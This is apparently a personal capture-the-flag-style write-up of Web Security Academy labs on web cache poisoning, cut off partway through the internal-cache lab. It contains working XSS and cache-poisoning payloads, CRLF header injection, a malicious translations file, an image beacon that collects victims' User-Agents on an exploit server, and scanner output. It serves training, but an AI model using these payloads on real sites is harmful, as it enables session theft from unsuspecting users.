# Web Cache Poisoning
## Parameter cloaking
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. 
There is also inconsistent parameter parsing between the cache and the back-end.

A user regularly visits this site's home page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser.

#### Solution

Navigate to Home page and check HTTP history.

Notice:

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
```

Using the `utm_content` from previous lab we can try something like this:

```http
GET /?utm_content=123&callback=setCountryCookie HTTP/2
```

Now this will be cacheable so it's not useful like this. 

However, running these two show that first cache the other:

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=runAlert HTTP/2
```

Just change the payload to:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=alert(1) HTTP/2
```

This solves the lab.

Keep in mind admin visits once per minute and cache expires every 35 sec, so you may need to re-poison.

---

#### My Complicated Solution that didn't work
Navigate to Home page and check HTTP history.

Notice:

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
```

Using the `utm_content` from previous lab we can try something like this:

```http
GET /?utm_content=123&callback=setCountryCookie HTTP/2
```

Now this will be cacheable so it's not useful like this. 
However, running these two show that first cache the other:

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=runAlert HTTP/2
```

Now again run these two to check if first cache the other:

```
GET /?utm_content=123 HTTP/2
GET / HTTP/2
```

Notice in Response:
```html
<link rel="canonical" href='//0ab2007a047988018589911800a900c7.web-security-academy.net/?utm_content=123'/>
```

```html
?utm_content=123'/><script>runAlert(alert(1);)</script>
```

Idea is to poison the Home Page then poison the geolocate call.

Guess they didn't want me to go that way.
```html
<link rel="canonical" href='//0ab2007a047988018589911800a900c7.web-security-academy.net/?utm_content=123&apos;/&gt;&lt;script&gt;runAlert(alert(1);)&lt;/script&gt;'/>
```

## Targeted web cache poisoning using an unknown header

![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning. 

A victim user will view any comments that you post. 

To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. 
However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

#### Solution

Running Param Miner for the Home page we find the following headers:
- `Origin`
- `Via`
- `X-Host`

Test `X-Host` header with Request:

```http
GET / HTTP/1.1
Host: my.h1-web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
X-HOST: test.net
...
```

And notice in Response:

```html
<script type="text/javascript" src="//test.net/resources/js/tracking.js"></script>
```

Note that `X-HOST: http://test.net` will result in error.

Also notice `Vary: User-Agent`. We will need that too.

Similar to [[Web cache poisoning with multiple headers]] we will prepare the payload on Exploit Server.
	- Set Body to
	```html
	alert(document.cookie)
	```
		- Since we will provide a `.js` file.
	- Set File to: `/resources/js/tracking.js`
	- Store the changes.


Set the `X-Host` header for payload:

```http
-
X-HOST: exploit-my.exploit-server.net
```

If we test this locally it will work. But: `However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.`

Open any post and notice Leave a comment section which allows HTML.

While it's not vulnerable to XSS injection it is vulnerable to HTML injection.

Idea:
- Inject an image that loads with the page sending the request to our exploit server
- Read the logs from other users to get the `User-Agent` header value

Comment: 
```html
<img src="https://exploit-my.exploit-server.net/getmeanagent">
```

Logs:
```
10.0.4.88       2025-03-04 12:03:11 +0000 "GET /getmeanagent HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

Update the Request

```http
GET / HTTP/1.1
Host: my.h1-web-security-academy.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
X-HOST: exploit-my.exploit-server.net
...
```

This should solve the lab.

### Automation

While  `wcvs` will find the Cache Poisoning we need bit of manual work to investigate `User-Agent` for this situation.

```shell
./wcvs -u https://0a73000904455853a7f3629800ef007b.h1-web-security-academy.net/ -gr
```

```shell
...
 --------------------------------------------------------------
| Header Poisoning
 --------------------------------------------------------------
Testing 1118 headers
[!] Unexpected Status Code 421 for 1st request of header Host
[*] header X-Host: Response Body contained 549270370434

[+] Header X-Host was successfully poisoned! cbwcvs: 524443806680 poison: 549270370434
[+] URL: https://0a73000904455853a7f3629800ef007b.h1-web-security-academy.net/?cbwcvs=524443806680
[+] Reason: Response Body contained 549270370434
[+] Curl: curl -X 'GET' -H 'Cookie: session=74XzhPguMhz3bJgJlZ7XIPLnrtOh7bFT' -H 'User-Agent: WebCacheVulnerabilityScanner v1.3.3' -H 'X-Host: 549270370434' 'https://0a73000904455853a7f3629800ef007b.h1-web-security-academy.net/?cbwcvs=524443806680'
...
```

## URL normalization
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. 

Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.

#### Solution

Try to visit non existing page:

```http
GET /cvarci HTTP/2
```

Notice the response:
```html
<p>Not Found: /cvarci</p>
```

Optionally, use `Origin: cb.net` for cache buster.

##### XSS

```http
GET /cvarci</p><script>alert(1)</script><p> HTTP/2
```

Running from the browser does not work
```
Not Found: /cvarci%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3E
```

But sending via Repeater will work. We got reflected XSS.

##### Cache Poisoning

Test if URL without encoded path will be cache the URL with encoded path:

```
GET /cvarci</p><script>alert(1)</script><p> HTTP/2
GET /cvarci%3c%2f%70%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e%3c%70%3e HTTP/2
```

First does cache the other. As explained in the materials this is due Normalized Cache Keys.

In the lab we have the option to deliver the link to victim.

##### Combining the two

Run the first request again to make sure it gets cached and send the following link to victim:

```
https://my.web-security-academy.net/cvarci%3C%2fp%3E%3Cscript%3Ealert%281%29%3C%2fscript%3E%3Cp%3E
```

## Web cache poisoning via a fat GET request
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. 

A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

#### Solution

Navigate to Home Page and notice in HTTP History

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
```

Let's try Fat GET

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: my.web-security-academy.net
...

callback=RunAlert
```

Followed by the Original GET Request with no body.
Notice that altered request cached the original.

Response:
```js
...
RunAlert({"country":"United Kingdom"});
```

Wait for cache to expire then send:
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: my.web-security-academy.net
...

callback=alert(1)
```

Optionally use `Origin: cb.com`  as a cache buster.

## Web cache poisoning via an unkeyed query parameter

![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. 

A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

#### Solution

##### Web Cache Poisoning
Send these two requests one after another:

```
GET / HTTP/2
GET /?test=123 HTTP/2
```

First one won't cache the other.

Do the same for these two:
```
GET / HTTP/2
GET /?utm_content=123 HTTP/2
```

First one caches the other. As they suggested in materials.

We can again add `Origin: cb.net` for Cache Buster. (Hit->Miss)

##### XSS

Now notice in response for `GET /?utm_content=123 HTTP/2` :
```html
<link rel="canonical" href='//my.web-security-academy.net/?utm_content=123'/>
```

Make a payload
```html
?utm_content=123'/><link rel=stylesheet href=1 onerror=alert(1)>
```

Don't forget to URL encode before sending. We got XSS.

##### Combine the two

Remove the `Origin` header (CB) and set path to:
```html
?utm_content=123'/><link rel=stylesheet href=1 onerror=alert(1)>
```

Send the Request. This solves the lab.

Keep in mind admin visits once per minute and cache expires every 35 sec, so you may need to re-poison.

## Web cache poisoning via an unkeyed query string
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning because the query string is unkeyed. 

A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.

#### Solution

##### Web Cache Poisoning

Navigate to Home page.
Send it to repeater and send the Request twice. 
Notice `X-Cache: miss`->`X-Cache: hit`.

Wait a bit for cache to reset.

**because the query string is unkeyed**
Open two tabs in Repeater:
- `GET / HTTP/2`
- `GET /?test=123 HTTP/2`

First one will cache the other as well.

> [!NOTE] 
> Since admin is also visiting Home page, if you get randomly cached response, it's most likely that.

**CB**: 
- If we add `Origin: cb.net` to the second Request we now get `X-Cache: miss` meaning we can use `Origin` as cache buster.
- We will continue testing with this CB.

##### XSS

Investigate Response for Home page:

```html
<link rel="canonical" href='//my.web-security-academy.net/?test=123'/>
```

Make a payload
```html
?test=123'/><link rel=stylesheet href=1 onerror=alert(1)>
```

Don't forget to URL encode before sending. We got XSS.

##### Combine the two

Remove the `Origin` header (CB) and set path to:
```html
/?test=123'/><link rel=stylesheet href=1 onerror=alert(1)>
```

Send the Request. This solves the lab.

Keep in mind admin visits once per minute and cache expires every 35 sec, so you may need to re-poison.

### Automation

While the WBVC will detect cache poisoning here, we need to manually add the Origin header as CB.

## Web cache poisoning with an unkeyed cookie
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. 

An unsuspecting user regularly visits the site's home page. 

To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.

#### Solution

Navigate to Login Page and inspect the Request.

Notice the Cookie
```
Cookie: session=wsC9Fdm8oU5G8YKr8KxmKPH3BOLUQaYU; fehost=prod-cache-01
```

Now inspect the Response and notice
```js
<script>
	data = {"host":"my.web-security-academy.net","path":"/login","frontend":"prod-cache-01"}
</script>
```

Navigate to Home page and verify all the same applies.

Test for XSS

```js
Cookie: session=wsC9Fdm8oU5G8YKr8KxmKPH3BOLUQaYU; fehost=prod-cache-01"};alert(1);x={"arg":"val
```

URL encode and test. 

In the Response notice
```http
-
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

They helped us out with the `Cache-Control` and `Age`.

```
Cookie: session=wsC9Fdm8oU5G8YKr8KxmKPH3BOLUQaYU; fehost=myValue
```

```http
-
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

```js
<script>
	data = {"host":"my.web-security-academy.net","path":"/login","frontend":"myValue"}
</script>
```

Sending the same request again we get
```http
-
Cache-Control: max-age=30
Age: 5
X-Cache: hit
```

Now delete the session from the Cookie and send again

```
Cookie: fehost=myValue
```

```http
-
Cache-Control: max-age=30
Age: 7
X-Cache: hit
```

Cookie is Unkeyed.

Insert the malicious payload into `fehost`, URL encode and send. This solves the lab.


### Automation

```shell
./wcvs -u https://my.web-security-academy.net/ -gr
```

```shell
...
 --------------------------------------------------------------
| Cookie Poisoning
 --------------------------------------------------------------
Checking cookie session (1/2)
Overwriting session=gc66Bbr474E4HKDwPe3fBVIH7dmI09hc with session=789733060205
Checking cookie fehost (2/2)
Overwriting fehost=prod-cache-01 with fehost=456470347598
[*] fehost=prod-cache-01: Response Body contained 456470347598

[+] Cookie fehost was successfully poisoned! cbwcvs: 156573310846 poison: 456470347598
[+] URL: https://my.web-security-academy.net/?cbwcvs=156573310846
[+] Reason: Response Body contained 456470347598
[+] Curl: curl -X 'GET' -H 'Cookie: session=gc66Bbr474E4HKDwPe3fBVIH7dmI09hc; fehost=456470347598' -H 'User-Agent: WebCacheVulnerabilityScanner v1.3.3' 'https://my.web-security-academy.net/?cbwcvs=156573310846'
...
```

## Web cache poisoning with an unkeyed header
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. 

An unsuspecting user regularly visits the site's home page. 

To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

#### Solution

1. Navigate to Home page and investigate the Request and Response.

Request:
```http
GET / HTTP/2
Host: my.web-security-academy.net
...
Connection: keep-alive

```

Response:
```http
HTTP/2 200 OK
...
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10987

<!DOCTYPE html>
<html>
    ...
    <body>
        <script type="text/javascript" src="//my.web-security-academy.net/resources/js/tracking.js"></script>
	...
    </body>
</html>
```

Notice the following:
- URL is reflected in the Response body
- Cache expires after 30 sec
- We also have the `Age` header so we can time the attacks
- First request is not cached

2. Run Param Miner to identify accepted headers

```
...
Initiating header bruteforce on my.web-security-academy.net
Identified parameter on my.web-security-academy.net: x-forwarded-host~%s.%h
Completed attack on my.web-security-academy.net
...
```

`X-Forwarded-Host` is identified.
 
3. Inject test URL with `X-Forwarded-Host`

Request:
```http
GET / HTTP/2
Host: my.web-security-academy.net
...
X-Forwarded-Host: evil-host.net

```

Response:
```http
HTTP/2 200 OK
...
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10943

<!DOCTYPE html>
<html>
    ...
    <body>
        <script type="text/javascript" src="//evil-host.net/resources/js/tracking.js"></script>
        ...
    </body>
</html>
```

Notice it reflected in the page code.

4. Verify `X-Forwarded-Host` is Unkeyed

Run original request again two times.

Second Response:
```http
-
Cache-Control: max-age=30
Age: 2
X-Cache: hit
```

Run modified request straight after the second original

```http
-
Cache-Control: max-age=30
Age: 5
X-Cache: hit
```

`X-Forwarded-Host` is Unkeyed.

5. Verify page is vulnerable to XSS

Set `X-Forwarded-Host` to:
```js
whatever.net/"></script><script>alert(document.cookie)</script><script src = "
```

Investigate Response:
```js
<script type="text/javascript" src="//whatever.net/">
</script>
<script>
	alert(document.cookie)
</script>
<script+src+%3d+"/resources/js/tracking.js">
</script>
```


6. Send the payload

Request:
```http
-
X-Forwarded-Host: whatever.net/"></script><script>alert(document.cookie)</script><script+src+%3d+"
```

This solves the lab.

### Automation

Use Web Cache Vulnerability Scanner to identify Web Cache Poisoning:

```shell
./wcvs -u https://my.web-security-academy.net/ -gr
```

Output:
```shell
...
WCVS v1.3.3 started at 2025-03-02_18-04-00
Exported report ./2025-03-02_18-04-00_WCVS_Report.json
...
[+] [Host] was successfully poisoned! cbwcvs: 977732862081 poison: [:31337]
[+] URL: https://my.web-security-academy.net/?cbwcvs=977732862081
[+] Reason: Response Body contained :31337
[+] Curl: curl -X 'GET' -H 'Cookie: session=244dGcu8uTWdYksA3KdRdeJ7uYr0uir1' -H 'User-Agent: WebCacheVulnerabilityScanner v1.3.3' -H 'Host: my.web-security-academy.net:31337' 'https://my.web-security-academy.net/?cbwcvs=977732862081'
...
[+] [X-Forwarded-Host X-Forwarded-Scheme] was successfully poisoned! cbwcvs: 390503664422 poison: [787683012570 nothttps]
[+] URL: https://my.web-security-academy.net/?cbwcvs=390503664422
[+] Reason: Response Body contained 787683012570
[+] Curl: curl -X 'GET' -H 'Cookie: session=244dGcu8uTWdYksA3KdRdeJ7uYr0uir1' -H 'User-Agent: WebCacheVulnerabilityScanner v1.3.3' -H 'X-Forwarded-Host: 787683012570' -H 'X-Forwarded-Scheme: nothttps' 'https://my.web-security-academy.net/?cbwcvs=390503664422'
...
 --------------------------------------------------------------
| Header Poisoning
 --------------------------------------------------------------
Testing 1118 headers
[!] Unexpected Status Code 421 for 1st request of header Host
[*] header X-Forwarded-Host: Response Body contained 778851969458

[+] Header X-Forwarded-Host was successfully poisoned! cbwcvs: 688019006856 poison: 778851969458
[+] URL: https://my.web-security-academy.net/?cbwcvs=688019006856
[+] Reason: Response Body contained 778851969458
[+] Curl: curl -X 'GET' -H 'Cookie: session=244dGcu8uTWdYksA3KdRdeJ7uYr0uir1' -H 'User-Agent: WebCacheVulnerabilityScanner v1.3.3' -H 'X-Forwarded-Host: 778851969458' 'https://my.web-security-academy.net/?cbwcvs=688019006856'
...
```

## Web cache poisoning with multiple headers
![Awesome Badges](https://img.shields.io/badge/level-practitioner-blue)

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. 

A user visits the home page roughly once a minute. 

To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

#### Solution

1. Open app and investigate (Click on everything and then look at HTTP History).
	   - Notice Request for `/resources/js/tracking.js`.

2. Running Param Miner we identify following header - `x-forwarded-scheme`
	   - For whatever reason Param Miner didn't find it but my guts say there should also be `X-Forwarded-Host`.

3. Add the header to the `/resources/js/tracking.js` Request
```http
-
Cookie: session=ogDUdsWx7wBqWyTRZ2zM6hWkemsfzYbP
X-Forwarded-Host: my.web-security-academy.net
X-Forwarded-Scheme: http
```

Optionally add parameter `cb=123` to the path as Cache Buster.

Notice we are now redirected.

```http
HTTP/2 302 Found
Location: https://my.web-security-academy.net/resources/js/tracking.js
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0


```

4. Changing the `X-Forwarded-Host`to
```
X-Forwarded-Host: my.web-security-academy.net/test
```

Results in Response with new location
```
Location: https://my.web-security-academy.net/test/resources/js/tracking.js
```

So whatever we set it gets `/resources/js/tracking.js` appended to the end.

5. Running the same Request again we get 

```http
-
Cache-Control: max-age=30
Age: 12
X-Cache: hit
```

6. Test the same but remove the cookie

```http
-
Cache-Control: max-age=30
Age: 26
X-Cache: hit
Content-Length: 0
```

Cookie is Unkeyed.

7. On the Exploit Server:
	- Set Body to
	```html
	alert(document.cookie)
	```
		- Since we will provide a `.js` file.
	- Set File to: `/resources/js/tracking.js`
	- Store the changes.

8. Update the headers of `/resources/js/tracking.js` Request to point to exploit lab

```
X-Forwarded-Host: exploit-my.exploit-server.net
X-Forwarded-Scheme: http
```

9. Navigate to Home page. This should solve the lab.

> [!WARNING] 
> For whatever reason lab wasn't solving for me.
> Then I googled [this forum discussion](https://forum.portswigger.net/thread/labs-web-cache-poisoning-not-solved-ac8d9856) 
> `wget https://my.web-security-academy.net/` solved the lab.

> [!NOTE]
> `X-Forwarded-Host` won't work unless we also add `X-Forwarded-Scheme` with the value different to `https`.

### Automation

```shell
 ./wcvs -u https://my.web-security-academy.net/ -gr
 ```
 ```shell
 ...
  --------------------------------------------------------------
| Multiple Forwarding Headers Poisoning
 --------------------------------------------------------------
[!] Unexpected Status Code 403 for 1st request of Host
[!] Unexpected Status Code 403 for 1st request of Host
[!] Unexpected Status Code 403 for 1st request of host
[!] Unexpected Status Code 302 for 1st request of X-Forwarded-Host and X-Forwarded-Scheme
[*] X-Forwarded-Host and X-Forwarded-Scheme: Response Body contained 600492421663
[!] Unexpected Status Code 302 for 2nd request of X-Forwarded-Host and X-Forwarded-Scheme

[+] [X-Forwarded-Host X-Forwarded-Scheme] was successfully poisoned! cbwcvs: 527667250183 poison: [600492421663 nothttps]
[+] URL: https://my.web-security-academy.net/?cbwcvs=527667250183
[+] Reason: Location header contains poison value 600492421663
[+] Curl: curl -X 'GET' -H 'Cookie: session=UueCE6h1ByxhuJkvoFfRT41JkBnTx3Hc' -H 'User-Agent: WebCacheVulnerabilityScanner v1.3.3' -H 'X-Forwarded-Host: 600492421663' -H 'X-Forwarded-Scheme: nothttps' 'https://my.web-security-academy.net/?cbwcvs=527667250183'

[*] Checking header(s) [X-Forwarded-Host X-Forwarded-Scheme] with value(s) [600492421663\r\nWeb_Cache: Vulnerability_Scanner nothttps] for Response Splitting, because it was reflected in the header Location

 --------------------------------------------------------------

```

## Cache key injection
![Awesome Badges](https://img.shields.io/badge/level-expert-blueviolet)

This lab contains multiple independent vulnerabilities, including cache key injection. 

A user regularly visits this site's home page using Chrome.

To solve the lab, combine the vulnerabilities to execute `alert(1)` in the victim's browser. 

Note that you will need to make use of the `Pragma: x-get-cache-key` header in order to solve this lab.

> [!NOTE]
> Remember that the injected origin header must be lowercase, to comply with the HTTP/2 specification.

### Solution

Navigate to Login page.
Using Param Miner returns no additional headers.

Verify we can use `Origin` as cache buster.
```
Origin: cb.net
```

#### Append arbitrary unkeyed content to the `lang` parameter

Notice the request path `/login/?lang=en`.
Let's try with 
```
/login?lang=en
``` 

Response:
```http
HTTP/2 302 Found
Location: /login/?lang=en
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 30
X-Cache: hit
Content-Length: 0
```

Notice it got cached and also notice the `Location` header.


Test if `utm_content` is keyed.
```http
GET /login?lang=en&utm_content=test HTTP/2
```

or

```http
GET /login?lang=en?utm_content=test HTTP/2
```

It is NOT keyed and it affects the `Location` header
```http
-
Location: /login/?lang=en&utm_content=test
```

or

```http
-
Location: /login/?lang=en?utm_content=test
```

That means we can manipulate the value of `Location` header with unkeyed values of `utm_content`.

#### Client-side parameter pollution via the `lang` parameter
Now inspect Request:
```http
GET /js/localize.js?lang=en&cors=0 HTTP/2
```

Response:
```
document.cookie = 'lang=en';
```

Test if we can manipulate the cookie

Request:
```http
GET /js/localize.js?lang=test&cors=0 HTTP/2
```

Response:
```
document.cookie = 'lang=test';
```

#### Response header injection via the `Origin` request header

Now let's test the `cors` parameter by setting it to `1`:

```http
GET /js/localize.js?lang=test&cors=1 HTTP/2
```

Notice `Vary: origin`

For `Origin: test.cb` we will get `Access-Control-Allow-Origin: test.cb`. Classical dev mistake.

#### cache key injection
Add  `Pragma: x-get-cache-key` header to the Request

```http
GET /js/localize.js?lang=test&cors=1 HTTP/2
Origin: test.cb
-
Pragma: x-get-cache-key
```

And notice the Response:
```
X-Cache-Key: /js/localize.js?lang=test&cors=1$$origin=test.cb
```

#### Combine all to poison `/login?lang=en`

We will use CRLF to add new lines. (URL encoded - `%0d%0`)

Origin Payload:
```
x
Content-Length: 8

alert(1)$$$$
```

URL Encoded:
```
x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$$$
```

```http
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```
Response:

```http
-
Access-Control-Allow-Origin: x
X-Cache-Key: /js/localize.js?lang=en?cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

Followed by:
```http
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
```

URL decoded:
```
utm_content=x&cors=1&x=1$$origin=x
Content-Length: 8

alert(1)$$#
```

Response:
```http
-
Location: /login/?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23
```

## Combining web cache poisoning vulnerabilities
![Awesome Badges](https://img.shields.io/badge/level-expert-blueviolet)

This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain.

A user visits the home page roughly once a minute and their language is set to English. 

To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

### Solution

This one is a real journey. Let's split it into 2 parts:
1. First identify the web cache to plant malicious JSON file for specified language that will execute DOM XSS.
2. Then identify the web cache to make users switch to that language.

#### Part 1: Translation Web Cache Poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

Remember all the steps from [[Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria]].
- Cache Poisoning
- DOM XSS
- Relaxation of CORS specifications with wildcards

Navigate to Home page, switch to another language and explore HTTP history.
- `/` - Request for Home Page. 
- `/setlang/en-gb?` - To set Proper English (language I selected) as a selected language.
- `/?localized=1` - Request to retrieve the home page with selected language.
- `/resources/json/translations.json` - Fetching the translation for selected language.

##### Cache Poisoning

In Responses for both `/` and `/?localized=1` we notice:

```javascript
<script>
	initTranslations('//' + data.host + '/resources/json/translations.json');
</script>
```

Now check `/resources/json/translations.json` and notice:

```json
{
    "en": {
        "name": "English"
    },
    ...
    "en-gb": {
        "name": "Proper English",
        "translations": {
            "Return to list": "From whence you came",
            "View details": "Do me the honour of elaborating",
            "Description:": "Pontifications on the subject matter:"
        }
    },
    ...
}
```

We are missing the part how to set the `data.host` value.

Let's check for Headers with Param Miner:
- `X-Forwarded-Host`
- `X-Original-Url`

Check **`X-Forwarded-Host`**:

```http
GET /?localized=1 HTTP/2
Host: my.web-security-academy.net
Cookie: session=ABKpktysNtt7G0ErlcDaTXhnahfbNZi2; lang=en
...
X-Forwarded-Host: test.net


```

In the Response, notice:
```js
<script>
	data = {"host":"test.net","path":"/"}
</script>
...
<script>
	initTranslations('//' + data.host + '/resources/json/translations.json');
</script>
```

This is similar to previous lab. Setup Exploit Server.

File:

```
/resources/json/translations.json
```

Body:

```json
{
    "en": {
        "name": "English"
    },
    ...
    "en-gb": {
        "name": "Proper English",
        "translations": {
            "Return to list": "Back to the warp",
            "View details": "Auger Array",
            "Description:": "Omnissiah Protects!"
        }
    },
    ...
}
```

Open `/?localized=1` in Repeater and set the `X-Forwarded-Host` header to point to Exploit Server:

```http
-
X-Forwarded-Host: exploit-my.exploit-server.net
```

Again, similar to previous lab we get the following error in the console:
```
Access to fetch at 'https://exploit-my.exploit-server.net/resources/json/geolocate.json' from origin 'https://my.web-security-academy.net' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
```

##### Relaxation of CORS specifications with wildcards

In Exploit Server set ACAO to `*` in Head section:

```http
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *
```

Cached page now loads and we get altered translation for selected language.

##### DOM XSS

Investigate the code on Home Page:

```html
<a class="button" href="/product?productId=1">Do me the honour of elaborating</a>
```

Investigate the code on Product Page:
```html
<section class="product">
...
	<label>Pontifications on the subject matter:</label>
...
	<div class="is-linkback">
		<a href="/">From whence you came</a>
	</div>
</section>
```

Remember `A user visits the home page roughly once a minute and their language is set to English.` We will focus on `"View details"` field.

Update Server Exploit

Body:

```json
{
    "en": {
        "name": "English"
    },
    ...
    "en-gb": {
        "name": "Proper English",
        "translations": {
            "Return to list": "Back to the warp",
            "View details": "</a><img src=1 onerror=alert(document.cookie) />Auger Array<a>",
            "Description:": "Omnissiah Protects!"
        }
    },
    ...
}
```

Re-poison the cache and verify alert pops up on localized Home page .
It will trigger for everyone who uses specified language.

> [!NOTE]
> Make sure you are working with `/?localized=1`.

> [!NOTE] 
> It won't work for default language (`en`) since it doesn't have any values in the JSON file. 
> Other language must be selected.

##### Part 2: Language Settings Web Cache Poisoning

Now we need to "make" other users select the language we poisoned.

When we change language Request was:

```http
GET /setlang/en-gb? HTTP/2
```

Now remember Param Miner also found **`X-Original-Url`**. 

> [!INFO]
> When `X-Original-Url` header is enabled, it allows us to overwrite the existing URL, potentially granting access to critical resources, such as a web application’s admin panel.
> We used it in the lab: [[URL-based access control can be circumvented]]

1. Observe that the `X-Original-URL` can be used to change the path of the request, so you can explicitly set `/setlang/es`. 
   However, you will find that this response cannot be cached because it contains the `Set-Cookie` header.

```http
GET / HTTP/2
Host: my.web-security-academy.net
...
X-Original-Url: /setlang/en-gb


```

```http
HTTP/2 302 Found
Location: /?localized=1
Cache-Control: private
Set-Cookie: lang=en-gb; Path=/; Secure
Set-Cookie: session=9fCI2bT9M9PsyY1Vp1AEcbWLZ6nnHRYS; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
X-Cache: miss
Content-Length: 0

```

2. Observe that the home page sometimes uses backslashes as a folder separator. 
   Notice that the server normalizes these to forward slashes using a redirect.
   Therefore, `X-Original-URL: /setlang\es` triggers a 302 response that redirects to `/setlang/es`. 
   
   Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.

If we change to one of these two:

```http
-
X-Original-Url: /setlang\en-gb
X-Original-Url: /setlang/en-gb//
```

We get cacheable Response:
```http
HTTP/2 302 Found
Location: /setlang/en-gb
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0

```

I will use the `/setlang\en-gb` option.
Remember to delete the Cookie header.

If we now open Home Page in another browser while the page is cached, we get language we set above.

##### Combining the two

Now in Repeater have two Requests:
1. `/?localized=1` with cache poisoned for language JSON file path.
2. `/` which sets the language to the one we poisoned.

Send then in the order. 
This should solve the lab but remember admin visits once per minute so you may need to poison it more than once.


##### What's different on this lab from other?
It has a Language selector on the top left corner.


#### Does cookies do anything in this lab?

First one sets the language on the backend and the second one fetches the updated content.

This will also add language preference to Cookie:
```
Cookie: session=TH73VwVmY3sWj3Tsp7BuGayK9vO7qckb; lang=en-gb
```

However I have no idea what this is used for as if you are to intercept the request and change to `lang=es` you will still get the same.
Which means language is set somewhere server side.
I still need to figure out how this work as I get different result in another browser.

## Internal cache poisoning

![Awesome Badges](https://img.shields.io/badge/level-expert-blueviolet)

This lab is vulnerable to web cache poisoning. 
It uses multiple layers of caching. 

A user regularly visits this site's home page using Chrome.

To solve the lab, poison the internal cache so that the home page executes `alert(document.cookie)` in the victim's browser.

### Solution

Trick here is to differentiate between external and internal cache. 
Sometimes we need to send the requests many times before we notice the fragments cached.

1. Navigate to the Home page and send the `GET /` request to Burp Repeater.

2. Notice changing the query we change the Response Body

```http
GET /?cb=mycb
```

Response:
```html
<link rel="canonical" href='//my.web-security-academy.net/?cb=mycb'/>
```

Also notice this does not cache the `/` response.

3. Use the Param Miner to discover `x-forwarded-host` header.

Add this to the Request:
```http
-
X-Forwarded-Host: test.net
```

Search for `test.net` in Response:
```html
	<link rel="canonical" href='//test.net/'/>
